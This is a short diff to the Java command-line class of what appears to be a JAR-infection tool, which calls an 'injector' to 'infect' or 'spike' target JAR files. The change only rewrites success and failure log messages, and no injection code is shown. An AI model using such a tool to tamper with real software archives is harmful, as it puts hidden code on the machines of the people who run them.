@@ -246,9 +246,13 @@ public class Cli {
             boolean didInfect = injector.infect(targetPath, outputPath);
 
             if (didInfect) {
-                log.info("Success.");
+                if (outputPath.equals(targetPath)) {
+                    log.info("Successfully spiked JAR '" + targetPath + "'.");
+                } else {
+                    log.info("Successfully spiked JAR '" + targetPath + "' -> '" + outputPath + "'.");
+                }
             } else {
-                log.warning("Failure.");
+                log.warning("Failed to spike JAR '" + targetPath + "'.");
             }
         } catch (IOException e) {
             throw new RuntimeException(e);
@@ -304,9 +308,13 @@ public class Cli {
         try {
             boolean didInfect = injector.infect(targetPath, outputPath);
             if (didInfect) {
-                log.info("Success.");
+                if (outputPath.equals(targetPath)) {
+                    log.info("Successfully spiked JAR '" + targetPath + "'.");
+                } else {
+                    log.info("Successfully spiked JAR '" + targetPath + "'-> '" + outputPath + "'.");
+                }
             } else {
-                log.warning("Failure.");
+                log.warning("Failed to spike JAR '" + targetPath + "'.");
             }
         } catch (IOException e) {
             throw new RuntimeException(e);
